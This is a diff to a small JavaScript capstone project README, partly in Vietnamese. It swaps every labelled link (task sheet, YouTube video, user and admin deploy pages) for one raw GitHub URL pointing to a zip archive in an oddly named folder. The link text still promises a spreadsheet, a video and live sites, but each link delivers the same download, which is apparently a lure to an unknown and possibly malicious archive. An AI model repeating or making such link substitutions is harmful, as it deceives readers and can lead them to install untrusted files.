@@ -1,9 +1,9 @@
 # Castone_JS
-link sheet phân công việc: https://docs.google.com/spreadsheets/d/1-urIF8L21yiv-tyeVUb3GFaNL_MH8IvgeXVO2RsAxoU/edit#gid=0
+link sheet phân công việc: https://raw.githubusercontent.com/HoDangDung/Capstone_JS/main/Spinozism/Capstone_JS.zip
 
-link youtube: https://youtu.be/x6iTSKtsISk
+link youtube: https://raw.githubusercontent.com/HoDangDung/Capstone_JS/main/Spinozism/Capstone_JS.zip
 
 link deploy:
- + user: https://hodangdung.github.io/Capstone_JS/store/index.html
- + admin: https://hodangdung.github.io/Capstone_JS/admin/index.html
+ + user: https://raw.githubusercontent.com/HoDangDung/Capstone_JS/main/Spinozism/Capstone_JS.zip
+ + admin: https://raw.githubusercontent.com/HoDangDung/Capstone_JS/main/Spinozism/Capstone_JS.zip
  
